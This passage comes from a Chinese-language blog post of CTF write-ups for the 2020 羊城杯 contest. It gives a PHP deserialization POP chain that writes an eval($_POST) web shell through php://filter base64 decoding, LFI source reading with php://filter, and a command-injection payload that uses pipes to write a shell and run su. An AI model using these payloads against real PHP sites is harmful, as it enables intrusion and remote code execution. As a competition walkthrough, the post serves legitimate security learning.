</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Yongen</span>{ <span style="color:#75715e">//flag.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $text;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>,$text<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>) {
</span></span><span style="display:flex;"><span>        $this <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> $file;
</span></span><span style="display:flex;"><span>        $this <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">=</span> $text;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hasaki</span>(){
</span></span><span style="display:flex;"><span>        $d   <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php die(&#34;nononon&#34;);?&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>        $a<span style="color:#f92672">=</span> $d<span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">text</span>;
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">@</span><span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">file</span>,$a);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Yasuo</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hasaki</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;I&#39;m the best happy windy man&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>没有反序列化入口</p>
<p>新知识，还可以扫描http的参数</p>
<pre tabindex="0"><code>pip3 install arjun
arjun -u URL
</code></pre><!-- raw HTML omitted -->
<p>我这里扫不出来，日了</p>
<p>看别人wp 扫出来c参数</p>
<p>直接构造链子吧，目的肯定是通过file_put_contents($this-&gt; file,$a);写入马执行命令</p>
<p>逻辑简单，通过__toString()调用hasaki()，如何调用toString其实就是c参数传参,echo触发</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">附上c参数的逻辑</span>
</span></span><span style="display:flex;"><span>$c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>]; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($c)){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $x <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($c);  <span style="color:#75715e">//echo 的时候会触发 __toString() 魔术方法
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;your hat is too black!&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>利用php伪协议绕过死亡die() ，构造pop如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GWHT</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hero;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Yongen</span>{ <span style="color:#75715e">//flag.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $text<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PD9waHAgZXZhbCgkX1BPU1RbJ2ZsYWcnXSk7Pz4=&#34;</span>; <span style="color:#75715e">/*&lt;?php eval($_POST[&#39;flag&#39;]);?&gt; 的base64编码*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GWHT</span>();
</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hero</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Yongen</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($a);
</span></span></code></pre></div><!-- raw HTML omitted -->
<blockquote>
<p>利用php伪协议绕过死亡die() ，用php伪协议以写入base64数据然后自动解码，前面的死亡die()就被忽略了</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302128476.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302128476.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302128476.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302128476.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302128476.png"
        title="image-20220930212810436" /></p>
<p>那么aaa.php得到&lt;?php @eval($_POST[1]);</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302135661.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302135661.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302135661.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302135661.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302135661.png"
        title="image-20220930213551630" /></p>
<p>这样aaa.php就是<!-- raw HTML omitted -->PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=</p>
</blockquote>
<h2 id="easyphp2">Easyphp2</h2>
<blockquote>
<p>LFI  短标签</p>
</blockquote>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302302861.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302302861.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302302861.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302302861.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302302861.png"
        title="image-20220930230239794" /></p>
<pre tabindex="0"><code>http://1.14.71.254:28101/?file=GWHT.php
</code></pre><p>这个url看起来就像是文件包含伪协议读文件</p>
<!-- raw HTML omitted -->
<p>是有过滤，看wp把base64两次url编码后，就能读到了</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302311393.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302311393.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302311393.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302311393.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302311393.png"
        title="image-20220930231112349" /></p>
<p>还有个协议也可以?file=php://filter/convert.quoted-printable-encode/resource=GWHT.php</p>
<p>得到源码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;max_execution_time&#39;</span>, <span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_COOKIE[<span style="color:#e6db74">&#39;pass&#39;</span>] <span style="color:#f92672">!==</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#39;PASS&#39;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;pass&#39;</span>, <span style="color:#e6db74">&#39;PASS&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;&lt;h2&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;hacker&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;h2&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;h1&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;404&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;h1&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;Sorry, only people from GWHT are allowed to access this website.&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;23333&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (isset($_GET[&#34;count&#34;])) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $count = $_GET[&#34;count&#34;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if(preg_match(&#39;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#39;, $count)){
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        	die(&#39;hacker!&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        echo &#34;&lt;h2&gt;The Count is: &#34; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &#34;&lt;/h2&gt;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    ?&gt;
</span></span></span></code></pre></div><p>然后第一段意思就是cookie不能为PASS，根据首页提示要等于GWHT</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302327268.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302327268.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302327268.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302327268.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302327268.png"
        title="image-20220930232747191" /></p>
<p>这个框就是count传参的地，效果是counter也就是计数器，返回字符串长度</p>
<p>利用<code>exec('printf \'' . $count . '\' | wc -c')</code>来getshell</p>
<pre tabindex="0"><code>去掉转义符就是 printf &#39; . $count . &#39; | wc -c
</code></pre><blockquote>
<p>wc命令</p>
<p>wc -c或&ndash;bytes或&ndash;chars 只显示Bytes数,这就实现了计数器的功能</p>
</blockquote>
<p>我们目前是想要执行命令并不想让他计数，考虑注释掉，但是#被过滤</p>
<p>这个时候可以考虑||管道符，只执行前面命令，|管道符是正确执行前面命令然后执行后面命令</p>
<pre tabindex="0"><code>printf &#39;&#39;| ls || &#39;&#39; | wc -c  管道符|结束printf&#39;&#39;的命令 接着执行ls
</code></pre><pre tabindex="0"><code>测试如果输入 aaa&#39;||&#39;就行成 printf&#39;aaa&#39; || &#39; &#39; | wc -c  就输出aaa
</code></pre><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302335852.png"
        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302335852.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302335852.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302335852.png 2x"
        data-sizes="auto"
        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202209302335852.png"
        title="image-20220930233536812" /></p>
<p>顺利执行命令</p>
<p>写shell进去也是一样的道理，&lt;?php被ban，用&lt;?=</p>
<pre tabindex="0"><code>printf&#39; &#39;| echo &#34;&lt;?= eval($_POST[1]);?&gt;&#34; &gt; shell.php || &#39; &#39; | wc -c
</code></pre><p>但是这一步卡住了，一直进不去</p>
<p>如果顺利的话应该能蚁剑连接，没有权限打开flag，然后终端用su命令读文件</p>
<pre tabindex="0"><code>printf &#34;GWHTCTF&#34; | su - GWHT -c &#39;cat /GWHT/system/of/a/down/flag.txt&#39;

用户名:GWHT   密码:GWHTCTF
</code></pre></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-08-20</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/" data-title="2020羊城杯"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/" data-title="2020羊城杯"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/" data-title="2020羊城杯"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/" data-title="2020羊城杯"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/" class="prev" rel="prev" title="2023巅峰极客"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>2023巅峰极客</a>
            <a href="/posts/ctf/0xgame2022/" class="next" rel="next" title="0xgame2022">0xgame2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
